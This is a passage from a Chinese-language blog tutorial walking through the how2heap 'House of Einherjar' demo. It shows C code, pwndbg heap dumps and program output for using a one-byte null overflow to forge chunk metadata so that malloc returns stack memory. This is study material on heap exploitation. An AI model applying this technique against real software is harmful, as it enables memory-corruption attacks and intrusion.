<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">   <span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">          <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">          <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>由于 b 的 size 是 0x100 的整数倍，因此不需要更改 b 的大小，只需要更改它的 prev_inuse 位。如果 b 的大小被修改，那我们需要在 b 的内部放一个 fake chunk 才能合并这个 chunk。</p>
<p>修改前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 &#x3D; (uint8_t *) 0x603050 &quot;&quot;</span><br><span class="line">pwndbg&gt; x&#x2F;20xg b-16</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000101      &lt;-- b size</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603040 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg b-16</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000100      &lt;-- b size overwritten</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040 &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 256,   # size: 257 -&gt; 256 </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来在 a 的最后 8 位写一个 fake prev_size 让它指向我们的 fake chunk。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">       <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Our fake prev_size will be 0x603040 - 0x7fffffffdc50 &#x3D; 0xffff8000006053f0</span><br><span class="line">                           chunk b      fake chunk</span><br></pre></td></tr></table></figure>
<p>修改之后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0x603040 &#123;</span><br><span class="line">  prev_size &#x3D; 18446603336227509232, </span><br><span class="line">  size &#x3D; 256, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$7 &#x3D; (uint8_t *) 0x603050 &quot;&quot;</span><br><span class="line">pwndbg&gt; x&#x2F;20xg b-32</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0xffff8000006053f0	0x0000000000000100</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>接下来修改 fake chunk 的 size 为 chunk b 的新 prev_size。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x fake_chunk </span><br><span class="line">$8 &#x3D; &#123;0x100, 0xffff8000006053f0, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50&#125;</span><br></pre></td></tr></table></figure>
<p>接下来 free 掉 chunk b。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p>这样 b 会和 fake chunk 结合，此时的 top chunk 被修改为了 fake chunk。由于我们释放了 chunk b，此时 PREV_INUSE 为 0，unlink 会根据 prev_size 寻找上一个 free chunk，并将它与当前 chunk 合并。</p>
<p>练习中的注释如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line"><span class="comment">//do two things: </span></span><br><span class="line"><span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line"><span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line"><span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line"><span class="comment">//at the location we control. </span></span><br><span class="line"><span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line"><span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line"><span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line"><span class="comment">//wilderness</span></span><br></pre></td></tr></table></figure>
<p>如果在 free b 之前申请另一个 chunk 会做两件事：</p>
<ol>
<li>我们需要调整 fake chunk 的 size 以便于 fake_chunk + fake_chunk 的 size 指向一块我们控制的区域</li>
<li>我们需要向我们控制的地址写 fake chunk 的 size。</li>
</ol>
<p>在做完这两件事之后，unlink 时我们的 fake chunk 就会通过 <code>size(P) == prev_size(next_chunk(P))</code> 的校验。</p>
<p>我们还要保证 fake chunk 与 wilderness?(这个咋翻译) 相对。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br></pre></td></tr></table></figure>
<p>这时我们再 malloc 的话，它就会从 fake chunk 开始分配了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Next malloc(0x200) is at 0x7fffffffdc60</span><br></pre></td></tr></table></figure>
<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;house_of_einherjar</span><br><span class="line">Welcome to House of Einherjar!</span><br><span class="line">Tested in Ubuntu 16.04 64bit.</span><br><span class="line">This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.</span><br><span class="line"></span><br><span class="line">We allocate 0x38 bytes for &#39;a&#39;</span><br><span class="line">a: 0x603010</span><br><span class="line">Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: 0x38</span><br><span class="line"></span><br><span class="line">We create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack</span><br><span class="line">However, you can also create the chunk in the heap or the bss, as long as you know its address</span><br><span class="line">We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks</span><br><span class="line">(although we could do the unsafe unlink technique here in some scenarios)</span><br><span class="line">Our fake chunk at 0x7fffffffdca0 looks like:</span><br><span class="line">prev_size (not used): 0x100</span><br><span class="line">size: 0x100</span><br><span class="line">fwd: 0x7fffffffdca0</span><br><span class="line">bck: 0x7fffffffdca0</span><br><span class="line">fwd_nextsize: 0x7fffffffdca0</span><br><span class="line">bck_nextsize: 0x7fffffffdca0</span><br><span class="line"></span><br><span class="line">We allocate 0xf8 bytes for &#39;b&#39;.</span><br><span class="line">b: 0x603050</span><br><span class="line"></span><br><span class="line">b.size: 0x101</span><br><span class="line">b.size is: (0x100) | prev_inuse &#x3D; 0x101</span><br><span class="line">We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;</span><br><span class="line">b.size: 0x100</span><br><span class="line">This is easiest if b.size is a multiple of 0x100 so you don&#39;t change the size of b, only its prev_inuse bit</span><br><span class="line">If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk</span><br><span class="line"></span><br><span class="line">We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk</span><br><span class="line">Our fake prev_size will be 0x603040 - 0x7fffffffdca0 &#x3D; 0xffff8000006053a0</span><br><span class="line"></span><br><span class="line">Modify fake chunk&#39;s size to reflect b&#39;s new prev_size</span><br><span class="line">Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set</span><br><span class="line">Our fake chunk size is now 0xffff800000626361 (b.size + fake_prev_size)</span><br><span class="line"></span><br><span class="line">Now we can call malloc() and it will begin in our fake chunk</span><br><span class="line">Next malloc(0x200) is at 0x7fffffffdcb0</span><br></pre></td></tr></table></figure>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2582">通过 how2heap 复习堆利用 (一）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86809">【技术分享】how2heap总结-下</a></p>
<p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.9_heap_exploit_4.html">3.1.9 Linux 堆利用（四）</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86ptmalloc%e6%ba%90%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90.pdf">glibc内存管理ptmalloc源代码分析.pdf</a></p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="http://www.qrzbing.cn/blog">qrzbing</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="http://www.qrzbing.cn/blog/2019/07/10/how2heap-4/">http://www.qrzbing.cn/blog/2019/07/10/how2heap-4/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/blog/tags/pwn/">pwn</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/blog/2019/07/19/how2heap-5/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">how2heap-5</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/blog/2019/07/09/how2heap-3/">
        <span class="next-text nav-default">how2heap-3</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:qrzbing#gmail.com" class="iconfont icon-email" title="email"></a>
        <a target="_blank" rel="noopener" href="https://github.com/qrzbing" class="iconfont icon-github" title="github"></a>
        <a href="/blog/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">qrzbing</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/blog/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/blog/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/blog/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/blog/js/src/even.js?v=2.11.0"></script>
</body>
</html>
